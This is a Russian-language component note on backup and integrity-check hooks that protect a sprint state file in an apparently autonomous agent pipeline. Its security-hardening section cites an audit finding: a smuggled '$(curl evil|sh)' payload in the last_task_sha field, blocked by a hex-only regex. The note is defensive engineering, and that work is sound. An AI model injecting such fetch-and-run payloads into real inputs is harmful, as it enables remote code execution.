---
title: state-integrity + state-backup — отказоустойчивость SPRINT_STATE (v2 Вариант B)
type: component
tags: [kit, hook, state, resilience, crash-durability]
created: 2026-07-02
updated: 2026-07-02
sources: [kit/hooks/state-integrity-check.sh, kit/hooks/state-backup.sh, kit/hooks/lib/state_integrity.py]
status: stable
---

# SPRINT_STATE v2 (Вариант B) — упрочнение без разделения

**TL;DR:** SPRINT_STATE.md остаётся монолитом (3.4КБ ≪ 6КБ), но получает crash-durability: авто-бэкап перед каждым коммитом, валидация + авто-восстановление при повреждении, `last_task_sha` для точки восстановления auto-resume. S61, ADR [[../decisions/0073-sprint-state-v2-variant-b]].

## Компоненты

| Файл | Событие | Роль |
|---|---|---|
| `state-backup.sh` | PreToolUse `git commit` | staged SPRINT_STATE.md → `state/.backup/SPRINT_STATE.<ts>.md` (ротация 20). fail-OPEN |
| `state-integrity-check.sh` + `lib/state_integrity.py` | SessionStart + PreToolUse push | валидный YAML (sprint/phase/branch), phase∈{1..9,between-sprints,autoresearch}, ≤6КБ. Повреждён → авто-восстановление из последнего .backup + log. **fail-OPEN** (не дедлочить auto-resume) |
| `last_task_sha:` (frontmatter) | per-task | HEAD code-commit последней задачи — точка восстановления auto-resume S58 |

## Почему Вариант B, не A (разделение)
PRE-PLAN вердикт: боль ≤6КБ закрыта дисциплиной (файл 3.4КБ 5 спринтов); разделение = миграция 17 читателей (агенты хардкодят путь, хуки парсят строки, гейтят merge) в живом прогоне. B решает реальную боль (обрыв → повреждение) с blast radius 0. A → триггеры пересмотра в ADR 0073.

## Почему fail-OPEN, не fail-CLOSED
Второй fail-CLOSED (сверх hooks-selfcheck) дедлочил бы unattended auto-resume S58, если бы сработал без человека. Восстановление из бэкапа + log + пропуск — безопаснее для автономного прогона.

## Repairer, не gate (важно для модели угроз)
Хук ВСЕГДА exit 0 — он не барьер, его единственный эффект — side-effect восстановление SPRINT_STATE.md. Money-гейты `phase-advance`/`review-gate` читают ровно этот файл, который хук авто-переписывает без человека. Это приемлемо ТОЛЬКО потому, что аудит S61 закрыл «что именно пишется»: восстанавливается лишь провалидированное, не-симлинк, содержимое; поле `last_task_sha` — чистый hex. Инвариант «gate-input пишется только человеком/ревью» и tamper-evidence бэкапов → S62.

## Закалка безопасности (security-auditor S61)
`safe_backups()` отсекает симлинки + файлы вне каталога (BLOCKER: symlink→секрет протекал в git). Restore ВАЛИДИРУЕТ бэкап до установки, идёт к старшему при невалидном, не пишет ничего если валидных нет (HIGH: подделанный `\| 6 Review \| done \|`). `last_task_sha` — full-match `^[0-9a-fA-F]{7,40}$` (HIGH: `$(curl evil\|sh)` в resume-prompt). Выбор бэкапа по mtime (sticky-poison). Control-байты sanitized в логе. Regression: 9/9 exploit-tests PASS.

## Проверено (S61 red/green)
integrity: валидный → тишина; нет frontmatter → восстановление из .backup; битый phase → восстановление; oversize → WARN. backup: commit со staged state → бэкап появился, ротация 20.

## Related
- [[auto-resume]] (last_task_sha усиливает восстановление) · [[hooks-selfcheck-hook]] (единственный fail-CLOSED — контраст) · [[../decisions/0073-sprint-state-v2-variant-b]]
